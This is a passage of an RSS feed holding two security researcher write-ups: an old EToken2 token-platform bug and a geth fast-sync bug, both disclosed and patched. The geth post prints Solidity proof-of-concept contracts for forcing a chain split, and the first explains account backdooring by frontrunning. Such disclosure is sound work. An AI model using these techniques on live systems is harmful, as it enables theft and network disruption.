ERC20-related events and would require that the proxy contract for a given symbol was the expected proxy. The third would perform the upgrade on the <code>EventsHistory</code> contract by replacing the handlers and then forever disable the ability to register new emitters, making the contract truly immutable.</p><p>On April 6th, a mere 4 days after I had taken that first step, the upgrades were deployed and this saga was forever <a href=\"https://etherscan.io/tx/0x0825e01f1253fc2592e54e23201e99ae0880a947033108bfa1ca868a23886475\">immortalized</a> on the blockchain.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/04/image-21.png\" class=\"kg-image\" alt=\"Uncovering a Four Year Old Bug\" loading=\"lazy\" width=\"1018\" height=\"149\" srcset=\"https://samczsun.com/content/images/size/w600/2021/04/image-21.png 600w, https://samczsun.com/content/images/size/w1000/2021/04/image-21.png 1000w, https://samczsun.com/content/images/2021/04/image-21.png 1018w\" sizes=\"(min-width: 720px) 720px\"></figure><hr><p>Special thanks to <a href=\"https://twitter.com/shark0der\">Anatol</a> for the very special role he played in this and <a href=\"https://github.com/lastperson\">Oleksii</a> for sacrificing his weekend in order to resolve this with me.</p>","content:encodedSnippet":"Every adventure requires a first step - The Cheshire Cat\nWhat does it take to find a bug? What about one in a contract that's survived the test of time? The journey to a critical vulnerability isn't always straightforward and might begin when you least expect it.\n\nFound a critical bug in a contract that's over 4 years old, possibly the oldest to ever be discovered. Full story coming soon so keep an eye out 👀\n— samczsun (@samczsun) April 5, 2021\n\n\nA few weeks ago I tweeted about a critical bug I had found. The bug affected contracts that are over four years old and now manage over a billion dollars in assets. Today, I'll tell you the story of how it happened.\nThe White Rabbit\nIt was just after lunch when I got a push notification from one of the Ethereum security group chats.\n\nThis immediately caught my attention for two reasons:\n\nMost users of go-ethereum (geth) will normally never run into an error, because the software is written to be extremely resilient\nThis error was occurring on the latest version of geth, meaning it had all the newest security patches\n\nHaving just found a bug in geth myself recently, I couldn't help wonder if there was an ongoing attack.\n\nAnatol confirmed that the block was indeed on mainnet and shared his log file to help with debugging.\n########## BAD BLOCK #########\nChain config: {ChainID: 1 Homestead: 1150000 DAO: 1920000 DAOSupport: true EIP150: 2463000 EIP155: 2675000 EIP158: 2675000 Byzantium: 4370000 Constantinople: 7280000 Petersburg: 7280000 Istanbul: 9069000, Muir Glacier: 9200000, YOLO v2: <nil>, Engine: ethash}\n\nNumber: 11805072\nHash: 0x0b3d0081b32c2159e2b77e5f2c798b737d0ae1a822669614c989377947c71ada\n     0: cumulative: 123312 gas: 123312 contract: 0x0000000000000000000000000000000000000000 status: 1 tx: 0x9bdf8792e0d6b62a68b9dbd849d60ca78ae6512d9a838d575d4f51d36a7ae095 logs: [0xc12c5d6000 0xc12c5d60b0 0xc12c5d6160 0xc12c5d6210 0xc12c5d62c0] bloom: 00200000000000040000000080000000000000000000001000010001000000000000000000000000000000000000000002000000080800000000000000000000000000000000000000000008000000200000000000000000000000008000010000000000000000000000000000000010000000000000000000000010000000000000000000000000004000000000000000000001000000080000004000000000000000000000000000000000000000000000000000000000000000000000000000008002000082000000000040000000000000000000001002000000000020000000200000000000000000000000000000000000000000400080000000000000 state: \n     [snip]\n     203: cumulative: 11152534 gas: 45752 contract: 0x0000000000000000000000000000000000000000 status: 1 tx: 0x63fe497529605f75abdaa5b026ef5e6d878fca827a7ee2a3168d9c4f0347baef logs: [0xc127c05970] bloom: 00000000000000000000000000000000000000000800000000010000000000000000000000000000000000000000000000000800000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000034000000000000000000000000000000000000000000000000000000000000 state: \n\n\nError: invalid gas used (remote: 12458355 local: 11152534)\n##############################\nThis error says that the block header claimed that all of the transactions used a total of 12458355 gas, but when the node executed all of the transactions it only used 11152534 gas instead. I first double-checked that my own node knew of the suspicious block.\n$ seth block 11805072 hash\n0x0b3d0081b32c2159e2b77e5f2c798b737d0ae1a822669614c989377947c71ada\nGiven that the block hash matched, I knew that this wasn't an exploit but rather some sort of error with Anatol's node. The error log tells us the gas used by each transaction, so I quickly wrote a script to check each transaction in the block and compare the actual gas used with what Anatol's node reported. This let me pinpoint the offending transaction.\n\nI knew that there must be some difference in state between Anatol's node and mainnet, so I DMed him for RPC access so I can inspect the contracts that the offending transaction interacted with.\n\nThe transaction in question was a simple ERC20 transfer, so I quickly simulated it on Anatol's node, which failed.\n\nI quickly confirmed that the sending account contained enough tokens so all that was left was to comb through each sub-call to see where the gas usage discrepancy came from. After wrangling with seth for a bit, I found the root cause.\n\nThis contract contains an address in storage slot 0 on mainnet but no address on Anatol's node, a clear indication that there was some storage corruption. Anatol revealed that he actually restored the geth database from a backup, so most likely something got lost along the way and the node couldn't read the storage entry for that specific contract. Given that it'd be practically impossible to figure out what else was corrupted, I recommend he give snap sync a shot to quickly get his node back up and running.\n\nDown the Rabbit Hole\nNow that the immediate mystery was solved, I turned my attention to the corrupted contract. While debugging the transaction, I recognized the contract as an EToken2-issued token. I had reviewed that particular platform a long time ago, but that was before I gained all the experience I have now. Sometimes all it takes was a fresh approach and I was feeling confident that things would be different this time.\nI started by defining my goals. Since this was an ERC20 contract, any way to get free tokens (either through stealing them from others or minting them myself) would have the highest impact. Next would be any form of griefing such as burning tokens that I don't own or making it impossible to transfer tokens.\nNow I could start reviewing. The token contract itself delegates the ERC20 functions such as transfer to an implementation contract, but interestingly the implementation may vary per-user. Essentially, the token contains a default implementation (the latest version) which can be upgraded at any time by the owner. If a user doesn't agree with the upgrade, they can choose to opt-out and fix their specific implementation to the current version instead of being dragged along to the new implementation. This was an extremely interesting mechanic but I quickly confirmed that there was no way for me to set a custom implementation for myself, so I moved on.\nNext up was the default implementation contract. Because the token wasn't using delegatecall but rather call, it needed to tell the implementation who the original caller was. If the implementation wasn't correctly authenticating the proxy, then it would be possible to spoof a transfer. Unfortunately, a quick check revealed that the implementation contract was secure as well.\nAfter one more hop through the main token contract I finally arrived at the EToken2 platform contract, which is where all of the ERC20 logic is truly implemented. If the previous contracts were the appetizers, then this would be the main course, and I was excited to dig in.\nCake and a Drink\nEarlier I had noticed that in order to be ERC20-compliant, each token contained two functions which emitted Transfer and Approval functions which could only be called by the EToken2 contract. It would be extremely interesting if I could somehow trick the EToken2 contract into emitting fake events, so I focused on this first.\nThere was only one place in the EToken2 contract which triggered a token to emit the event, and that was in _proxyTransferEvent.\nfunction _proxyTransferEvent(uint _fromId, uint _toId, uint _value, bytes32 _symbol) internal {\n    if (proxies[_symbol] != 0x0) {\n        // Internal Out Of Gas/Throw: revert this transaction too;\n        // Recursive Call: safe, all changes already made.\n        Proxy(proxies[_symbol]).emitTransfer(_address(_fromId), _address(_toId), _value);\n    }\n}\nInterestingly though, the function didn't take the proxy directly but the symbol indirectly. This was a classic example of an indirection attack because if I could change the value of proxies[_symbol] then I would be able to trigger a Transfer event on any target I wanted.\nThere were three calls to _proxyTransferEvent: minting would trigger an event from address(0) to msg.sender, burning would trigger an event from from  to address(0), and transferring would trigger an event from from to to. The first two were not particularly useful because I could only control at most one of the two parameters, but the last was interesting because I could potentially trigger a Transfer event from an arbitrary address to an arbitrary address.\nUnfortunately, here I ran into a problem. The only way to reach the _transfer function was through the proxyTransferFromWithReference function, and that function would only allow the address specified in proxies to trigger a transfer for the specific symbol. This meant that if I owned a token and updated my proxy to the proxy for another token, I would no longer be able to trigger the transfer to cause the exploit.\nIt seemed like this potential exploit was dead, but I was reluctant to give up on it so I scrolled around some more. It was then that I really looked closer at the function signature for _transfer.\nfunction _transfer(\n    uint _fromId,\n    uint _toId,\n    uint _value,\n    bytes32 _symbol,\n    string _reference,\n    uint _senderId\n) internal checkSigned(_senderId, 1) returns (bool);\nI had completely dismissed the checkSigned modifier because it was obviously a no-op in the default configuration. If it was significant, then users would have to submit some sort of signature with each transfer and that was obviously not happening. Now, with nowhere else to turn, I decided to look into what exactly checkSigned was doing.\n    function _checkSigned(Cosigner _cosigner, uint _holderId, uint _required) internal returns(bool) {\n        return _cosigner.consumeOperation(sha3(msg.data, _holderId), _required);\n    }\n\n    modifier checkSigned(uint _holderId, uint _required) {\n        if (!isCosignerSet(_holderId) || _checkSigned(holders[_holderId].cosigner, _holderId, _required)) {\n            _;\n        } else {\n            _error('Cosigner: access denied');\n        }\n    }\nIncredible! It turns out that checkSigned actually performed an external call if a Cosigner is set for a user. This would explain why I never saw any users providing any signatures for a simple transfer. At the same time, this security feature was exactly what I needed to finalize my exploit.\nI've talked about how reentrancy is really just a subset of what I've dubbed unsafe external calls, because the real risk is in the fact that control flow is handed to a third-party contract which can then go and do whatever it wants. The attacker could choose to reenter through the same function, but they could just as well do anything else, and this is a great example of that.\nThe problem I was facing was that I needed proxies[symbol] to be my own proxy before the transfer call, but a different value after I had begun the transfer process. Now with the cosigner functionality, I could set a custom cosigner which would swap my symbol's proxy when it receives a call to consumeOperation. This call would happen after the call to proxyTransferFromWithReference but before the call to _proxyTransferEvent, allowing me to trigger an arbitrary event on any EToken2-issued token!\nPepper\nThis was a good start, but the impact was not quite what I was looking for. This was because EToken2 is a whitelisted platform and only a centralized authority could issue new tokens. If I were an attacker and I wanted to pull off this attack, I would have to sign up and probably go through KYC/AML, which is obviously not ideal. It was also unclear who exactly might be affected by this bug, and I couldn't really go and test it for myself.\nUndeterred, I stowed this finding away and kept looking for something else. While scanning through the contract, I noticed some interesting logic for transferring access from one user to another.\n    function grantAccess(address _from, address _to) returns(bool) {\n        if (!isCosignerSet(getHolderId(_from))) {\n            _error('Cosigner not set');\n            return false;\n        }\n        return _grantAccess(getHolderId(_from), _to);\n    }\n\n    function _grantAccess(uint _fromId, address _to) internal checkSigned(_fromId, 2) returns(bool) {\n        // Should recover to previously unused address.\n        if (getHolderId(_to) != 0) {\n            _error('Should recover to new address');\n            return false;\n        }\n        // We take current holder address because it might not equal _from.\n        // It is possible to recover from any old holder address, but event should have the current one.\n        address from = holders[_fromId].addr;\n        holders[_fromId].addr = _to;\n        holderIndex[_to] = _fromId;\n        // Internal Out Of Gas/Throw: revert this transaction too;\n        // Recursive Call: safe, all changes already made.\n        eventsHistory.emitRecovery(from, _to, msg.sender);\n        return true;\n    }\nAs it happens, I was so engrossed in figuring out how exactly to swap around the proxy that I didn't pay attention to what was actually going on in the contract. Notice that in the signature for _transfer, the from and to values are actually uint, not address. The EToken2 contract maintains a mapping of users (address) to holder id (uint) and this was the logic for granting your holder id to another address.\nThe moment I realized this, I started studying this function in earnest. At a high level, this function essentially transferred ownership of some data from one entity to another, and one common mistake to make when implementing this sort of internal ownership transfer is to update the receiver correctly but forget to invalidate the sender. If the receiver isn't updated correctly, any sort of testing will instantly reveal that there's a problem. If the sender isn't invalidated correctly, simple tests might not notice anything wrong.\nLooking closer at the implementation of _grantAccess, I saw that it was intentionally designed such that it's possible to determine the previous address that owned a specific holder id. This was intended to allow a user who accidentally granted access to the wrong wallet to still maintain ownership, but intuitively I knew something was off here.\nEven still, I couldn't quite figure out what that was at first glance. After all, if an attacker were to grant access to their holder id to another user, that's just putting their own funds at risk. Why would anyone want to do that?\nAfter stewing on it for a little bit, I realized that I was looking at it in the wrong way. The key was that while the other user would have full ownership over \"my\" holder id, I would also have full ownership over \"their\" holder id. In other words, I would be able to backdoor any new user of the EToken2 platform and gain full access to their account, which translates to control over any EToken2-issued token they owned.\nIt was a quick step from there to figure out how to weaponize this exploit. I needed to grant access to a user before they first use the EToken2 platform, but I can't just go around granting access to random addresses. The solution was clear - I could just scan the mempool for transactions which would result in a user becoming registered with the EToken2 platform, and then frontrun any transactions I find. What's more, because of EToken2's architecture, I wouldn't just be attacking a single token but multiple tokens with multi-million dollar market caps.\n\n\n\n\n\n\n\n\n\nAt this point, I knew I had found what I was looking for, and it was time to contact the project.\n52\nFinding the bug was one thing, but fixing it was another. EToken2 had been designed to be non-upgradable, but forcing every single token issued on top of EToken2 to migrate their data to a new contract would be unduly burdensome. Oleksii, fellow white hat and also the head architect at Ambisafe, agreed. We had to find another way.\nThere weren't many things in _grantAccess that could revert. In fact, there was only one. The very last line in the function logged an event using the eventHistory contract. If this call reverted, then so would the call to _grantAccess and it would be impossible for anyone to backdoor another account. However, the EventsHistory contract doesn't allow administrators to redefine the handler for an event.\n    function addVersion(address _caller, string _name, string _changelog) noValue() checkAccess(\"admin\") returns(bool) {\n        if (versions[_caller] != 0) {\n            return false;\n        }\n        if (bytes(_name).length == 0) {\n            return false;\n        }\n        if (bytes(_changelog).length == 0) {\n            return false;\n        }\n        uint version = ++latestVersion;\n        versions[_caller] = version;\n        versionInfo[version] = VersionInfo(block.number, msg.sender, _caller, _name, _changelog);\n        return true;\n    }\n\n    function () noValue() {\n        if (versions[msg.sender] == 0) {\n            return;\n        }\n        // Internal Out Of Gas/Throw: revert this transaction too;\n        // Call Stack Depth Limit reached: revert this transaction too;\n        // Recursive Call: safe, all changes already made.\n        if (!emitters[msg.sig].delegatecall(msg.data)) {\n            throw;\n        }\n    }\nIt seemed like we were at a dead end, but we quickly realized the situation wasn't nearly as bad as it appeared. Although the EventsHistory contract was intended to be immutable, it too had a bug which could be \"exploited\" by the admins.\nEach emitter was handled using a delegatecall, which causes the code to be executed with the current contract's context. If we wanted to perform an upgrade on the EventsHistory contract, we could just register a fake emitter which would perform the upgrades we wanted by directly writing to storage.\nOleksii quickly wrote a few contracts to patch up the vulnerabilities I had found. The first would replace the handler for the emitRecovery function and would require that any addresses being granted access had explicitly opted in to being granted access. The second would replace the handler for all ERC20-related events and would require that the proxy contract for a given symbol was the expected proxy. The third would perform the upgrade on the EventsHistory contract by replacing the handlers and then forever disable the ability to register new emitters, making the contract truly immutable.\nOn April 6th, a mere 4 days after I had taken that first step, the upgrades were deployed and this saga was forever immortalized on the blockchain.\n\nSpecial thanks to Anatol for the very special role he played in this and Oleksii for sacrificing his weekend in order to resolve this with me.","dc:creator":"samczsun","content":"What does it take to find a bug? What about one in a contract that's survived the test of time?","contentSnippet":"What does it take to find a bug? What about one in a contract that's survived the test of time?","guid":"6069538c8b092400019ea099","isoDate":"2021-04-19T18:39:44.000Z","from":"https://samczsun.com/rss/","hashId":"a8b8e7f7329d94cb672ecf621ddb4def"},{"creator":"samczsun","title":"Booby Trapping the Ethereum Blockchain","link":"https://samczsun.com/booby-trapping-the-ethereum-blockchain/","pubDate":"Thu, 27 May 2021 22:54:20 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2021/05/129911009_xl.jpg\" alt=\"Booby Trapping the Ethereum Blockchain\"><p>This is the second in a series of blog posts about bugs I&apos;ve found in <a href=\"https://github.com/ethereum/go-ethereum/\">go-ethereum</a> (Geth). If you haven&apos;t already, take a look at Part 1 <a href=\"https://samczsun.com/the-block-mined-in-january-584942419325/\">here</a>.</p><p>Today&apos;s post is about a bug in Geth&apos;s state downloader which could be used to trick it into syncing with mainnet incorrectly. If exploited, an attacker could have booby trapped the Ethereum blockchain and triggered a hard fork at will.</p><h1 id=\"synchronization\">Synchronization</h1><p>Whenever someone wants to run an Ethereum node, they must first synchronize with the network. This means downloading or computing all of the data needed to build a complete picture of the chain state at the latest block. Depending on the needs of the user, some tradeoffs between security and speed can be made, so Geth supported (at the time) two different sync modes: full sync and fast sync.</p><p>As the name would suggest, full sync performs a full synchronization of the Ethereum blockchain. This means that Geth will download and validate the proof-of-work seals on every single block. Geth will also execute every single transaction in the block, which allows it to generate the blockchain state locally without needing to trust other nodes. This is more secure but comes with a heavy speed tradeoff, as a full Geth sync may take anywhere from days to weeks to complete.</p><p>However, some users may not want to wait weeks for a full sync to complete. Perhaps they have a deadline to meet or they simply don&apos;t think the speed tradeoff is worth it. For this, Geth offers a mode where chain data up to a recent block (known as the pivot) is synchronized using a faster approach, with only the few remaining blocks being synchronized using the slower full sync algorithm. In fast sync mode, Geth downloads but does not verify the proof-of-work on every block, instead choosing certain blocks at random. Geth also does not execute any transactions, instead choosing to download the state trie directly from peers in order to arrive at the final blockchain state.</p><p>Of course, Geth doesn&apos;t just blindly trust state trie data that peers send back, or a malicious peer could claim that a certain account has much more ether than it actually does. To understand how Geth can tell whether the data it just received is correct or not, we must first understand the Merkle-Patricia trie.</p><h1 id=\"merkle-patricia-trie\">Merkle-Patricia Trie</h1><p>The Merkle-Patricia trie (MPT) is a key data structure in Geth and is a combination of the Merkle tree and the Patricia trie.</p><p>Put very simply, a Patricia trie stores data in a tree-like structure based on the data&apos;s prefix. This is a more optimal way of storing similar data when compared to something like a hashmap, although there may be a speed tradeoff. For example, here&apos;s how several words all starting with <code>r</code> might be stored in a Patricia trie.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2021/05/1920px-Patricia_trie.svg-1-.png\" class=\"kg-image\" alt=\"Booby Trapping the Ethereum Blockchain\" loading=\"lazy\" width=\"1920\" height=\"1200\" srcset=\"https://samczsun.com/content/images/size/w600/2021/05/1920px-Patricia_trie.svg-1-.png 600w, https://samczsun.com/content/images/size/w1000/2021/05/1920px-Patricia_trie.svg-1-.png 1000w, https://samczsun.com/content/images/size/w1600/2021/05/1920px-Patricia_trie.svg-1-.png 1600w, https://samczsun.com/content/images/2021/05/1920px-Patricia_trie.svg-1-.png 1920w\" sizes=\"(min-width: 720px) 720px\"><figcaption>By Claudio Rocchini - Own work, CC BY 2.5, https://commons.wikimedia.org/w/index.php?curid=2118795</figcaption></figure><p>Meanwhile, a Merkle tree is simply a tree where the leaf nodes are hashes of the data and all other nodes are hashes of their children. If a user knows the Merkle root (i.e. the top hash) of the Merkle tree and wants to check whether a specific piece of data was contained in the tree, they can do so using only a path through the tree, which is proportional to the <code>log</code> of the number of leaf nodes, rather than the number of leaf nodes itself. In the diagram below, a user can prove that <code>L2</code> is a member of the tree by providing <code>Hash 0-0</code> and <code>Hash 1</code>. The verifier will then generate <code>Hash 0-1</code>, <code>Hash 0</code>, and <code>Top Hash</code> which can be compared with the Merkle root they expected.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2021/05/1920px-Hash_Tree.svg-1-.png\" class=\"kg-image\" alt=\"Booby Trapping the Ethereum Blockchain\" loading=\"lazy\" width=\"1920\" height=\"1222\" srcset=\"https://samczsun.com/content/images/size/w600/2021/05/1920px-Hash_Tree.svg-1-.png 600w, https://samczsun.com/content/images/size/w1000/2021/05/1920px-Hash_Tree.svg-1-.png 1000w, https://samczsun.com/content/images/size/w1600/2021/05/1920px-Hash_Tree.svg-1-.png 1600w, https://samczsun.com/content/images/2021/05/1920px-Hash_Tree.svg-1-.png 1920w\" sizes=\"(min-width: 720px) 720px\"><figcaption>By Azaghal - Own work, CC0, https://commons.wikimedia.org/w/index.php?curid=18157888</figcaption></figure><p>With a MPT, the prefix-based storage layout of the Patricia trie is combined with the Merkle tree to create a data structure whose contents can be cryptographically verified while still maintaining good runtime performance.</p><p>In the MPT, keys and values are arbitrary byte strings. To retrieve the value for a key, the key is first converted into a sequence of hexadecimal characters such that every byte becomes two hex characters. Then, the root node is consulted to determine what the next node should be for the first character in the sequence. The child node is then consulted for the second character, and the process repeats until the final node is found for the final character in the sequence.</p><p>In the example below, we see there are actually three different types of nodes in the MPT. An extension node (or, a short node, as it&apos;s referred to in the Geth codebase) is an optimization which states that the given node is responsible for multiple characters in the stream. In this case, the root node covers all keys which begin with <code>a7</code>, removing the need for two distinct nodes to represent <code>a</code> and <code>7</code>. A branch node (or a full node) contains pointers for every possible character as well as one extra slot for the value at the current node. Finally, a leaf node (or a value node) indicates that the given node must match until the end of the key<sup>1</sup>.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2021/05/YZGxe-1-.png\" class=\"kg-image\" alt=\"Booby Trapping the Ethereum Blockchain\" loading=\"lazy\" width=\"2000\" height=\"1413\" srcset=\"https://samczsun.com/content/images/size/w600/2021/05/YZGxe-1-.png 600w, https://samczsun.com/content/images/size/w1000/2021/05/YZGxe-1-.png 1000w, https://samczsun.com/content/images/size/w1600/2021/05/YZGxe-1-.png 1600w, https://samczsun.com/content/images/size/w2400/2021/05/YZGxe-1-.png 2400w\" sizes=\"(min-width: 720px) 720px\"><figcaption>By Lee Thomas</figcaption></figure><h1 id=\"state-trie\">State Trie</h1><p>Now that we know how the Merkle-Patricia trie works, we can examine the global state trie itself.</p><p>The global state trie is where most of the data for the blockchain is stored. Although it&apos;s convenient to imagine the state trie as a distinct entity that is unique to each block, the reality is that duplicating the entire state trie for each block would be extremely inefficient as only a small percentage of the trie changes from block to block. Instead, Geth maintains what can be imagined like a pool of MPT nodes. The state trie for each block is simply a subset of the whole pool, and as new blocks are mined or imported, new MPT nodes are inserted into the pool.</p><p>In order to identify the root nodes in the pool of nodes, the block header must be consulted. Every block contains a field known as the <code>stateRoot</code>, which points to the root node of the MPT which stores account data keyed by the account address<sup>2</sup>. This allows Geth to look up account information such as the nonce or balance for any address using the algorithm we described above.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2021/05/Untitled-2.png\" class=\"kg-image\" alt=\"Booby Trapping the Ethereum Blockchain\" loading=\"lazy\" width=\"978\" height=\"455\" srcset=\"https://samczsun.com/content/images/size/w600/2021/05/Untitled-2.png 600w, https://samczsun.com/content/images/2021/05/Untitled-2.png 978w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Original by Lee Thomas</figcaption></figure><p>Note that for contracts, the account state will contain a non-empty <code>storageRoot</code> and <code>codeHash</code>. The <code>storageRoot</code> points to another root node, but this time for a MPT which stores contract storage data. This MPT is keyed on the storage slot and the value is the raw data itself.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2021/05/Untitled-3.png\" class=\"kg-image\" alt=\"Booby Trapping the Ethereum Blockchain\" loading=\"lazy\" width=\"949\" height=\"455\" srcset=\"https://samczsun.com/content/images/size/w600/2021/05/Untitled-3.png 600w, https://samczsun.com/content/images/2021/05/Untitled-3.png 949w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Original by Lee Thomas</figcaption></figure><p>To store the MPT on disk, Geth chose to use LevelDB as its database. However, LevelDB is a key-value datastore that only supports string-to-string mappings, and a MPT is not a string-to-string mapping. To solve this problem, Geth flattens the global state trie by writing each node as a key-value pair: the key is the hash of the node and the value is the serialized node itself. This is also how Geth is able to look up the state trie for any given block, because the <code>stateRoot</code> field in the block header is the key which can be used to find the serialized MPT node in LevelDB.</p><h1 id=\"trie-confusion\">Trie Confusion</h1><p>So let&apos;s say that you&apos;re starting up a Geth node and you&apos;re connecting to the network using fast sync. Geth will quickly download all of the block data but not execute any transactions. Before long, you&apos;ll have a chain of blocks but no state information. Here, Geth kicks off the state downloader which begins synchronizing from the pivot block&apos;s <code>stateRoot</code>.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-go\">// NewSync creates a new trie data download scheduler.\nfunc NewSync(root common.Hash, database ethdb.KeyValueReader, callback LeafCallback, bloom *SyncBloom) *Sync {\n\tts := &amp;Sync{\n\t\tdatabase: database,\n\t\tmembatch: newSyncMemBatch(),\n\t\trequests: make(map[common.Hash]*request),\n\t\tqueue:    prque.New(nil),\n\t\tbloom:    bloom,\n\t}\n\tts.AddSubTrie(root, 0, common.Hash{}, callback)\n\treturn ts\n}</code></pre><figcaption><a href=\"https://github.com/ethereum/go-ethereum/blob/87c463c47aa6d10a55a4b860bab3d53199814d01/trie/sync.go#L246-L255\">Source</a></figcaption></figure><p>The state downloader will send a request to its peers for the MPT node data corresponding to the MPT node key. When it receives a result, it verifies that the node data hashes to the expected node key. If it does, then the state downloader knows that the node is correct and will process it by dispatching more requests for each child of the node.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-go\">\t\t// Create and schedule a request for all the children nodes\n\t\trequests, err := s.children(request, node)\n\t\tif err != nil {\n\t\t\treturn committed, i, err\n\t\t}\n\t\tif len(requests) == 0 &amp;&amp; request.deps == 0 {\n\t\t\ts.commit(request)\n\t\t\tcommitted = true\n\t\t\tcontinue\n\t\t}\n\t\trequest.deps += len(requests)\n\t\tfor _, child := range requests {\n\t\t\ts.schedule(child)\n\t\t}</code></pre><figcaption><a href=\"https://github.com/ethereum/go-ethereum/blob/87c463c47aa6d10a55a4b860bab3d53199814d01/trie/sync.go#L205-L218\">Source</a></figcaption></figure><p>If a leaf node is encountered, that is, a node which contains a serialized account state, then the account&apos;s code and state trie will be queued for fetching.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-go\">\tcallback := func(leaf []byte, parent common.Hash) error {\n\t\tvar obj Account\n\t\tif err := rlp.Decode(bytes.NewReader(leaf), &amp;obj); err != nil {\n\t\t\treturn err\n\t\t}\n\t\tsyncer.AddSubTrie(obj.Root, 64, parent, nil)\n\t\tsyncer.AddRawEntry(common.BytesToHash(obj.CodeHash), 64, parent)\n\t\treturn nil\n\t}</code></pre><figcaption><a href=\"https://github.com/ethereum/go-ethereum/blob/87c463c47aa6d10a55a4b860bab3d53199814d01/core/state/sync.go#L31-L39\">Source</a></figcaption></figure><p>Note that there&apos;s a distinction between synchronizing a sub trie and a raw entry. While both will download an arbitrary blob of data, if the syncer is expecting a raw trie then it will parse the data as a trie node and begin synchronizing its children. On the other hand, if the syncer is expecting a raw entry it will simply write the blob to the database and terminate.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-go\">\t\t// If the item was not requested, bail out\n\t\trequest := s.requests[item.Hash]\n\t\tif request == nil {\n\t\t\treturn committed, i, ErrNotRequested\n\t\t}\n\t\tif request.data != nil {\n\t\t\treturn committed, i, ErrAlreadyProcessed\n\t\t}\n\t\t// If the item is a raw entry request, commit directly\n\t\tif request.raw {\n\t\t\trequest.data = item.Data\n\t\t\ts.commit(request)\n\t\t\tcommitted = true\n\t\t\tcontinue\n\t\t}</code></pre><figcaption><a href=\"https://github.com/ethereum/go-ethereum/blob/87c463c47aa6d10a55a4b860bab3d53199814d01/trie/sync.go#L183-L197\">Source</a></figcaption></figure><p>Additionally, note that it&apos;s not uncommon for Geth to want to request the same node multiple times. For example, two contracts might share the same <code>stateRoot</code> if they contain identical storage, or two accounts might share the same account state. In this case, Geth doesn&apos;t want to spam the network with spurious requests so it will merge them together.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-go\">func (s *Sync) schedule(req *request) {\n\t// If we&apos;re already requesting this node, add a new reference and stop\n\tif old, ok := s.requests[req.hash]; ok {\n\t\told.parents = append(old.parents, req.parents...)\n\t\treturn\n\t}\n\t// Schedule the request for future retrieval\n\ts.queue.Push(req.hash, int64(req.depth))\n\ts.requests[req.hash] = req\n}</code></pre><figcaption><a href=\"https://github.com/ethereum/go-ethereum/blob/87c463c47aa6d10a55a4b860bab3d53199814d01/trie/sync.go#L246-L255\">Source</a></figcaption></figure><p>However, the syncer doesn&apos;t merge the <code>raw</code> attribute of a request. This means that if there is already a pending raw entry request but the syncer schedules a sub trie request with the same hash, it will be merged and the end result will still be a raw entry request.</p><p>Remember that a raw request does not process the node for children to be synced. This means that if we can somehow generate a collision between a raw node and a sub trie node, we&apos;ll be able to cause Geth to sync an incomplete state trie. Furthermore, Geth (at the time) doesn&apos;t bail out when reading from a trie node that doesn&apos;t exist, likely assuming that such a situation could never happen if the downloader reported a successful sync, meaning that a Geth node with a missing trie node would behave completely differently from any other node with a fully synchronized trie.</p><p>So how can we generate such a collision? It turns out to be extremely simple: all we need to do is deploy a contract whose code is equal to the serialized state root of another contract we control. Our code hash will necessarily be the same as the state root hash, which means that if our contract code is synchronized first, our other contract&apos;s state trie will never be fully downloaded.</p><h1 id=\"putting-it-all-together\">Putting it all Together</h1><p>Fully weaponizing this vulnerability would have required multiple steps and a lot of waiting.</p><p>First, we deploy a contract whose state trie will be overwritten using the exploit. This contract should have a unique <code>stateRoot</code> so that the MPT node associated with that <code>stateRoot</code> won&apos;t be synchronized earlier.</p><pre><code class=\"language-solidity\">contract Discrepancy {\n    uint public magic = 1;\n    \n    // make sure we have a unique stateRoot\n    uint[] private filler = [1,2,3,4,5,6,7,8,9,0];\n}</code></pre><p>Next, we deploy another contract which will use the discrepancy to trigger a hard fork:</p><pre><code class=\"language-solidity\">contract Hardfork {\n    function hardfork(Discrepancy target) public {\n        require(target.magic() == 0, &quot;no discrepancy found&quot;);\n        \n        selfdestruct(msg.sender);\n    }\n}</code></pre><p>Finally, we deploy a third contract whose code will be equivalent to the state root of our <code>Discrepancy</code> contract. We must take care here to ensure that the address of this contract is &quot;smaller&quot; than the address of the discrepancy contract itself so that it will always be synced before the discrepancy contract.</p><pre><code class=\"language-solidity\">contract Exploit {\n    constructor(bytes memory stateRoot) public {\n        assembly {\n            return(add(stateRoot, 0x20), mload(stateRoot))\n        }\n    }\n}</code></pre><p>Now we sit back and relax. As new Geth nodes join the network using fast sync, they will request the <code>Exploit</code> contract first which will sync its state sub trie as well as its code. When <code>Exploit</code>&apos;s code is synced, it will create a raw request which looks exactly identical to a request for <code>Discrepancy</code>&apos;s state root, except it won&apos;t be processed as a sub trie request. This means that the node will never download <code>Discrepancy</code>&apos;s state trie so future requests to read <code>magic</code> will return <code>0</code> instead of <code>1</code>.</p><p>After sufficient time has passed, all we need to do is call <code>Hardfork.hardfork(discrepancy)</code>. Every node which has correctly synchronized the entire network will see a reverted transaction, while every Geth node which had joined the network using fast sync will see a successful transaction. This will result in two different state roots for that block, meaning that we just triggered a chain split at will.</p><p>The Geth team quickly patched this attack by properly handling trie read errors in <a href=\"https://github.com/ethereum/go-ethereum/pull/21039\">PR #21039</a>, then fully fixed the vulnerability by distinguishing between code blobs and trie blobs in <a href=\"https://github.com/ethereum/go-ethereum/pull/21080\">PR #21080</a>.</p><h1 id=\"conclusion\">Conclusion</h1><p>This was an extremely 